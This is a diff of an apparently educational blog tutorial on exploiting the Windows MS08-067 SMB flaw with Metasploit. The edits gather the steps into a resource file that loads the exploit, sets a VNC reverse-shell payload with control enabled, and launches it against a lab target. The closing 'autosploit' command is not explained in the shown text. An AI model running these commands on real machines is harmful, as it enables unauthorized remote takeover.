@@ -22,6 +22,18 @@ Loading the payload (Software used to give you control)
 
 Set the Settings and "pwn the box"
 
+<b>Find your own IP</b>
+Press Ctrl+Shift+T in order to bring up a new terminal tab
+
+{% highlight ruby %}
+ifconfig
+{% endhighlight %}
+
+You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likely different.
+
+![image tooltip](/blog/images/ms08_067/ifconfig.JPG)
+
+
 <b>Searching for the Exploit Command</b>
 
 The first thing we need to do is use the code identified in part 2. MS08_067 is the exploit we will use. But how do we load it? We need to get the command from the rapid7 database. Go to...
@@ -40,78 +52,37 @@ Look at the code under "Module Name." We will use that once we load Metasploit
 
 [Offensive Security: Payloads][payloads]
 
-Open a terminal and load Metasploit's terminal interface with the following command
+Open a terminal and load nano again. Type in the following.
 
 {% highlight ruby %}
-msfconsole
+nano windows.rc
 {% endhighlight %}
 
-Use the exploit we found in Rapid7 with the "use" command.
+We need to copy and paste the following lines of code which will later be used as commands. Be sure the 192.168.1.244 IP is set to your own target PC.
 
 {% highlight ruby %}
 use exploit/windows/smb/ms08_067_netapi
-{% endhighlight %}
-
-There are many useful payloads. I will recommend we use a reverse TCP payload in order to gain a VNC session. Load the payload with the "set" command.
-
-{% highlight ruby %}
+#Use the exploit we found in Rapid7 with the "use" command.
 set PAYLOAD windows/vncinject/reverse_tcp
-{% endhighlight %}
-
-<b>Settings</b>
-
-We want to see if we have the correct settings. Use the following command.
-
-{% highlight ruby %}
-show options
-{% endhighlight %}
-
-You should get something that looks like this
-
-![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)
-
-You may have noticed a few lines are missing. Specifically LHOST and RHOST. LHOST is the local host (your PC) and RHOST is the remote host (target PC)
-
-Let's fill those in with the set command
-
-{% highlight ruby %}
+#There are many useful payloads. I will recommend we use a reverse TCP payload in order to gain a VNC session. Load the payload with the "set" command.
 set RHOST 192.168.1.244
 #I am using the ip of my own target computer. Use the IP for your own
-{% endhighlight %}
-
-Before we fill in LHOST, we need to the the IP of your own Linux machine.
-
-Press Ctrl+Shift+T in order to bring up a new terminal tab
-
-{% highlight ruby %}
-ifconfig
-{% endhighlight %}
-
-You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likely different.
-
-![image tooltip](/blog/images/ms08_067/ifconfig.JPG)
-
-{% highlight ruby %}
 set LHOST 192.168.1.48
 #use the IP you just looked up in ifconfig
-{% endhighlight %}
-
-We filled in all the empty fields so we should be good right? Almost. By default, the VNC will only let you spy on the target machine. We want to enable control. Make one more setting.
-
-{% highlight ruby %}
 set ViewOnly false
+#Allows the user to control the machine
+exploit
+#HACK IT!!!
 {% endhighlight %}
 
-Run the show options again and make sure you have these settings.
-
-![image tooltip](/blog/images/ms08_067/msfconsole_show_options2.JPG)
+Press Ctrl+O then Enter to save the file.
 
 <b>Hack It!</b>
 
 Finally, run the command
 
 {% highlight ruby %}
-exploit
+autosploit
 {% endhighlight %}
 
 Congratulations, you did it!!
